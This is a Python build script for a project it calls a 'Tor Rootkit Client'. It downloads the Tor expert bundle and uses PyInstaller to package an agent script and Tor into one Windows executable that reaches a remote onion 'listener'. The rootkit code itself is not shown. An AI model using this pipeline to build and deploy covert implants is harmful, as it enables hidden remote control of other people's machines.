import PyInstaller.__main__
import requests
import os
import zipfile
import sys
from argparse import ArgumentParser


def get_tor_expert_bundle():
    # create directory for the tor expert bundle
    os.mkdir('torbundle')
    os.chdir('torbundle')

    # download tor expert bundle
    tor_url = 'https://archive.torproject.org/tor-package-archive/torbrowser/10.5.6/tor-win32-0.4.5.10.zip'
    file_data = requests.get(tor_url, allow_redirects=True)

    # write downloaded tor expert bundle
    try:
        file = open('tor.zip', 'wb')
        file.write(file_data.content)
    except Exception as error:
        print('[-] Error while writing tor expert bundle: {}'.format(error))
        sys.exit(1)
    else:
        print('[*] Wrote tor expert bundle to file')

    # unzip tor expert bundle
    file = zipfile.ZipFile('tor.zip')
    file.extractall('.')
    print("[*] Unpacked Tor expert bundle")

    # change directory back to \client
    os.chdir('..')


# def parse_args():
#     parser = ArgumentParser(description='Python3 Tor Rootkit Client')
#     parser.add_argument('onion', type=str, help='The remote onion address of the listener.')
#     parser.add_argument('port', type=int, help='The remote hidden service port of the listener.')
#     args = parser.parse_args()
#     return args.onion, args.port


if __name__ == '__main__':
    # dont download everytime
    if not os.path.isdir('torbundle') and os.name == 'nt':
        get_tor_expert_bundle()

    # if os.name == 'nt':
    PyInstaller.__main__.run([
        'agent.py',
        '--onefile',
        '--add-data=torbundle;torbundle'
    ])
    # else:
    #     PyInstaller.__main__.run([
    #         'agent.py',
    #         '--onefile',
    #     ])
